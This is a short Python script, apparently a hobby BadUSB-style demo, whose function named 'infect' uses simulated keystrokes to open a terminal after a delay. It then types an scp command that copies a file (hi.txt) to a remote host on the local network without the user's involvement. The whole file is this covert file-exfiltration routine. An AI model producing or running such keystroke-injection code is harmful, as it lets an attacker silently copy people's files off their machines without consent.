from pynput.keyboard import Key, Controller
import time
import os
keyboard = Controller()

def infect():
    time.sleep(10)
    keyboard.press(Key.ctrl)
    keyboard.press(Key.alt)
    keyboard.press('t')
    keyboard.release(Key.ctrl) 
    keyboard.release(Key.alt)
    keyboard.release('t')

    keyboard.type("scp hi.txt pi@192.168.88.229:/home/pi/Documents")
    keyboard.tap(Key.enter)
    time.sleep(1)
    

